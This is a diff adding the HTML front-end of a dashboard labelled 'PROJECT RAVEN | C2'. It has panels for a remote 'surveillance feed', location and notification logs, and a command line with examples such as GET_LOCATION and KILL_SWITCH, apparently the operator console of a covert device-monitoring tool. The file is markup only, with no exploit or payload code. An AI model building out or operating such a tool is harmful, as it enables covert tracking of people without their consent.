@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PROJECT RAVEN | C2</title>
+    <link rel="stylesheet" href="css/style.css">
+    <script src="/socket.io/socket.io.js"></script>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <h1>PROJECT RAVEN <span class="status offline" id="connectionStatus">[OFFLINE]</span></h1>
+            <div class="clock" id="clock">00:00:00</div>
+        </header>
+
+        <main>
+            <div class="panel video-panel">
+                <h2>// SURVEILLANCE FEED</h2>
+                <div id="remoteVideoContainer">
+                    <video id="remoteVideo" autoplay playsinline></video>
+                    <div class="overlay">WAITING FOR SIGNAL...</div>
+                </div>
+                <div class="controls">
+                    <button id="btn-start-stream" class="btn danger">INITIATE STREAM</button>
+                    <button id="btn-stop-stream" class="btn">TERMINATE</button>
+                </div>
+            </div>
+
+            <div class="panel log-panel">
+                <h2>// INTELLIGENCE LOGS</h2>
+                <div class="tabs">
+                    <button class="tab active" data-type="location">LOCATION</button>
+                    <button class="tab" data-type="notifications">NOTIFICATIONS</button>
+                    <button class="tab" data-type="system">SYSTEM</button>
+                </div>
+                <div id="log-output" class="terminal-window">
+                    <div class="log-entry">System initialized... waiting for data.</div>
+                </div>
+            </div>
+        </main>
+
+        <footer>
+            <div class="command-line">
+                <span class="prompt">admin@raven:~$</span>
+                <input type="text" id="cmd-input" placeholder="Enter command (e.g., GET_LOCATION, KILL_SWITCH)..." autocomplete="off">
+            </div>
+        </footer>
+    </div>
+
+    <script src="js/dashboard.js"></script>
+</body>
+</html>
